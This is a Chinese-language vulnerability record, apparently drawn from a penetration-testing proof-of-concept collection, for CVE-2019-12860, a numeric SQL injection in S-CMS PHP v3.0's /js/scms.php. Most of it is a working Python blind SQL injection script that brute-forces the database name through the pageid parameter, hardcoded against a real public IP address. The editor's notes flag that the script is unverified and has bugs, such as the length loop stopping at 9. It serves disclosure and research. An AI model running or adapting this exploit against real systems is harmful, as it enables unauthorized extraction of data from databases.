---
cve: "CVE-2019-12860"
source: "Mr-xn/Penetration_Testing_POC"
product: "S-CMS PHP3.0"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: "CVE-2019-12860"
referenced_identifiers: ""
identifier_role: "primary"
identifier_status: "unknown"
title: "S-CMS PHP v3.0存在SQL注入漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：js/scms.php jssdk公开可达；固定pageid1返回特定图片标识"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-08c7377a28a4e44d983656e2"
entity_id: "ve-08c7377a28a4e44d983656e2"
schema_version: "1"
---

## 核对与使用边界

- 附件待补：原 `POC_Details/S-CMS PHP v30存在SQL注入漏洞.pdf` 未在仓库对应位置找到，现保留原链接并标缺附件；正文请求不能补足未读取的 PDF 证据，不猜造附件内容。

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：js/scms.php jssdk公开可达；固定pageid1返回特定图片标识

- **事实待核（1）**：描述定位182–204又称83/87/95行未解释版本差异。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **证据待核（2）**：脚本硬编码公网目标和页面图片作为布尔判据，不能通用；数据库名长度只试0–9，&gt;9返回None会异常。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **证据待核（3）**：rs.encode不是response.encoding，字符循环无break，缺超时/对照。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **证据待核（4）**：PDF相对链接不是Markdown图片，不在6301图验证范围需另检查目标；原始源码未在本篇。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# S-CMS PHP v3.0存在SQL注入漏洞

### 漏洞简介  

|漏洞名称|上报日期|漏洞发现者|产品首页|软件链接|版本|CVE编号|
--------|--------|---------|--------|-------|----|------|
|S-CMS PHP v3.0存在SQL注入漏洞|2019-05-31|zhhhy|[https://www.s-cms.cn/download.html?code=php](https://www.s-cms.cn/download.html?code=php) | [https://www.s-cms.cn/download.html?code=php](https://www.s-cms.cn/download.html?code=php) |PHP v3.0| [CVE-2019-12860](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-12860)|  

#### 漏洞概述  

> 漏洞代码位置：/js/scms.php 第182-204行,在第83行处，变量$pageid接受使用POST方式传递的pageid的值。而在第87行和第95行处，变量$pageid被直接拼接进SQL语句之中，从而产生注入。而由于是数字型注入，避免使用单引号等符号以至于绕过了防御。   

### POC实现代码如下：  

> 构造如下poc.py  

``` python
import requests
import urllib.parse

chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_0123456789'

url='http://106.14.144.32:2000/js/scms.php'

def getDatabaseLength():
    print('开始爆破数据库长度。。。')
    for i in range(10):
        payload="1%0Aand%0Aif(length(database())>{},1,0)#".format(i)
        payload=urllib.parse.unquote(payload)
        data = {
            'action':'jssdk',
            'pagetype':'text',
            'pageid':payload
        }
        # print(data)
        # data = urllib.parse.unquote(data)
        # print(data)
        rs = requests.post(url=url,data=data)
        rs.encode='utf-8'
        # print(rs.text)
        if "20151019102732946.jpg" not in rs.text:
            print("数据库名的长度为：{}".format(i))
            return i

def getDatabaseName():
    print('开始获取数据库名')
    databasename = ''

    length = getDatabaseLength()
    # length = 4
    for i in range(1,length+1):
        for c in chars:
            payload='1%0Aand%0Aif(ascii(substr(database(),{},1))={},1,0)#'.format(i,ord(c))
            # print(payload)
            payload = urllib.parse.unquote(payload)
            data = {
                'action': 'jssdk',
                'pagetype': 'text',
                'pageid': payload
            }
            rs = requests.post(url=url, data=data)
            rs.encode = 'utf-8'
            # print(rs.text)
            if "20151019102732946.jpg" in rs.text:
                databasename = databasename+c
                print(databasename)

    return databasename
getDatabaseName() 
```
### 漏洞详情：[PDF版详情](POC_Details/S-CMS%20PHP%20v30存在SQL注入漏洞.pdf)


---

> 来源：Mr-xn/Penetration_Testing_POC
